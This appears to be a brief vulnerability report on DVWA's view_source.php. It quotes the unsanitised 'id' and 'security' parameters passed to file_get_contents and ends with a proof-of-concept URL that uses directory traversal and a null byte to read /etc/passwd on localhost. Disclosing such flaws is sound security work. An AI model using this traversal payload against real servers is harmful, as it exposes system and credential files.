The problem is here:

vulnerabilities/view_source.php Line 11 and 12:
--------------------------------
$id = $_GET[ 'id' ];
$security = $_GET[ 'security' ];
--------------------------------

vulnerabilities/view_source.php Line 41:
--------------------------------
$source = @file_get_contents( 
DVWA_WEB_PAGE_TO_ROOT."vulnerabilities/{$id}/source/{$security}.php" );
--------------------------------

PoC:
http://127.0.0.1/dvwa/vulnerabilities/view_source.php?id=fi&security=../../../../../../etc/passwd%00
